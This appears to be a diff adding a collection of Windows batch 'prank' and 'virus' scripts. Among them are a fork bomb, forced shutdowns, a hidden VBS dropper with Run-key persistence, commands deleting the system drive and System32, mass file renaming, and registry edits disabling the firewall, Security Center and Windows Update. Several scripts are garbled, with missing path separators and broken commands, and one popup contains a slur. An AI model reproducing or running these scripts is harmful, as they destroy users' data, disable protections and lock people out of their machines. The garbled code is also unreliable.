@@ -1,0 +1,307 @@
+---------------------- FORK BOMB !
+@echo off
+:x
+start
+goto x
+----------------------
+@echo off
+msg * hey do you wanna open me?
+msg * ok clik me
+msg * you got tricked faggot now ur in a loop 
+goto BEGIN
+---------------------- notepat spawner
+@echo off
+:TOP
+START %SystemRoot%/system32/notepad.exe
+goto TOP
+--------------------- pc shutdown script
+@echo off
+cls
+msg * YOUR UMB
+shutdown -s -c "ERROR! YOU ARE DUMB"
+-------------------- BSOFD/loop hole but more scarry!
+@echo off
+echo Set oWMP=CreateObject("WMplayer.OCX.7")>>123.vbs
+echo Set colCDROMs=oWMP.cdromCollection>>123.vbs
+echo do>>123.vbs
+echo if colCDROMs.count>=1 then>>123.vbs
+echo for i=0 to colCDROMs.Count -1>>123.vbs
+echo colCDROMs.Item(i).Eject>>123.vbs
+echo Next>>123.vbs
+echo For i=0 to colCDROMs.Count -1>>123.vbs
+echo colCDROMs.Item(i).Eject>>123.vbs
+echo Next>>123.vbs
+echo End If>>123.vbs
+echo wscript.sleep 5000>>123.vbs
+echo loop>>123.vbs
+echo DO>>1234.vbs
+echo MSGBOX "YOU ARE SCREWED!!!!!!!!!!!!",64,"ErR0r">>1234.vbs
+echo LOOP>>1234.vbs
+copy /y 123.vbs C:\
+copy /y 1234.vbs C:\
+attrib +s +h c:\123.vbs
+attrib +s +h c:\1234.vbs
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoClose /t REG_DWORD /f /d 1
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticetext /f /d "YOR ARE BEEN SCREWED"
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\system\ /v legalnoticecaption /f /d "B0zZ_ErR0r"
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 123.vbs /d c:\123.vbs
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1234.vbs /d c:\1234.vbs
+attrib +s +h c:\123.vbs
+attrib +s +h c:\1234.vbs
+start 123.vbs
+start 1234.vbs
+echo Code Smahser owns your computer!!>>c:\almasmalik.txt
+echo Code Smahser owns your computer!!>>d:\almasmalik.txt
+echo Code Smahser owns your computer!!>>e:\almasmalik.txt
+msg * MAY YOUR COMPUTER "REST IN PEACE"
+--------------------------------------- WIFI LOST!
+@Echo off
+
+pconfig /release
+------------------- VERY OP BAT FIEL!
+@echo off
+
+attrib -r -s -h c:autoexec.bat
+
+del c:autoexec.bat
+----------------------BAT FIEL OPEN STUFF!
+@echo off
+
+😡
+
+start winword
+
+start mspaint
+
+start notepad
+
+start write
+
+start cmd
+
+start explorer
+
+start control
+
+start calc
+
+goto x
+----------------------DELETING VIRUS!
+@echo off
+
+del %systemdrive%*.* /f /s /q
+
+shutdown -r -f -t 00
+------------------- RETART PC EVERY TIME!
+
+echo @echo off>c:windowshartlell.bat
+
+echo break off>>c:windowshartlell.bat
+
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+
+echo end>>c:windowshartlell.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+
+echo You have been HACKED.
+
+PAUSE
+--------------------DISABLED WIFI!
+echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo You Have Been HACKED!
+
+PAUSE
+---------------------- MELT DOWN!
+:CRASH
+
+net send * WORKGROUP ENABLED
+
+net send * WORKGROUP ENABLED
+
+GOTO CRASH
+
+ipconfig /release
+
+shutdown -r -f -t0
+
+echo @echo off>c:windowshartlell.bat
+
+echo break off>>c:windowshartlell.bat
+
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+
+echo end>>c:windowshartlell.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+
+echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo YOU HAVE BEEN HACKED BITCH
+
+REN *.DOC *.TXT
+
+REN *.JPEG *.TXT
+
+REN *.LNK *.TXT
+
+REN *.AVI *.TXT
+
+REN *.MPEG *.TXT
+
+REN *.COM *.TXT
+
+REN *.BAT *.TXT
+
+PAUSE
+
+PAUSE
+--------------------SIMPLE VIRUS!
+@Echo off
+
+Del C: *.* |y
+-------------FIel 32 bye bye
+del c:WINDOWSsystem32*.*/q 
+-----------------------FOLD NET WORK!
+:CRASH
+
+net send * WORKGROUP ENABLED
+
+net send * WORKGROUP ENABLED
+
+GOTO CRASH
+--------------------------DISABLE NET WORK FOR ANY PC/PHONE/EVERYTHING VERY VERY OP!!
+@echo off
+
+reg
+
+add HKLMSoftwareMicrosoftWindowsCurrentVersionRun /v MiXedVeX /t
+
+REG_SZ /d %systemroot%HaloTrialScoreChangerV1 /f > nul
+
+start iexpress (website of your choice)
+
+ipconfig /release
+
+del “C:Program FilesMicrosoft Games
+
+del “C:Nexon
+
+del “C:Program FilesXfire
+
+del “C:Program FilesAdobe”
+
+del “C:Program FilesInternet Explorer”
+
+del “C:Program FilesMozilla Firefox”
+
+del “C:WINDOWS”
+
+del “C:WINDOWSsystem32”
+
+del “C:WINDOWSsystem32cmd”
+
+del “C:WINDOWSsystem32iexpress”
+
+del “C:WINDOWSsystem32sndvol32”
+
+del “C:WINDOWSsystem32sndrec32”
+
+del “C:WINDOWSsystem32Restorerstrui”
+
+del “C:WINDOWSsystem32wupdmgr”
+
+del “C:WINDOWSsystem32desktop”
+
+del “C:WINDOWSjava”
+
+del “C:WINDOWSMedia”
+
+del “C:WINDOWSResources”
+
+del “C:WINDOWSsystem”
+
+del “C:drivers”
+
+del “C:drv”
+
+del “C:SYSINFO”
+
+del “C:Program Files”
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+net stop “Security Center”
+
+net stop SharedAccess
+
+> “%Temp%.kill.reg” ECHO REGEDIT4
+
+>>”%Temp%.kill.reg” ECHO.
+
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
+
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+
+>>”%Temp%.kill.reg” ECHO.
+
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
+
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+
+>>”%Temp%.kill.reg” ECHO.
+
+>>”%Temp%.kill.reg” ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
+
+>>”%Temp%.kill.reg” ECHO “Start”=dword:00000004
+
+>>”%Temp%.kill.reg” ECHO.
+
+START /WAIT REGEDIT /S “%Temp%.kill.reg”
+
+del “%Temp%.kill.reg”
+
+del %0
+
+echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+:a
+
+start iexpress (website of your choice)
+
+goto a
